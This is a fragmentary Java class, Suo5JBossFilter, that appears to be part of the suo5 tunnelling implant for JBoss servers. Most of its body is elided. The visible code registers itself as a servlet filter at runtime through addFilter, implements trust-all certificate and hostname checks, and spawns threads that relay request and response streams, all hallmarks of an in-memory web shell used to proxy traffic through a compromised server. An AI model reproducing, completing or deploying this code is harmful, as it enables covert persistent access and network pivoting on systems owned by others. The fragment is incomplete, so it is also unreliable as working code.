...
public class Suo5JBossFilter extends ClassLoader implements Filter, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5JBossFilter(ClassLoader loader){
        super(loader);
    }

    public Suo5JBossFilter(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }

    public Suo5JBossFilter(){
    }
    ...
    public String toString() {
        try {
            this.parameterMap.put("result", addFilter(Suo5JBossFilter.class).getBytes());
...
//                e.printStackTrace();
    ...
    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        ...
        Thread t = null;
        try {
            Suo5JBossFilter p = new Suo5JBossFilter(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
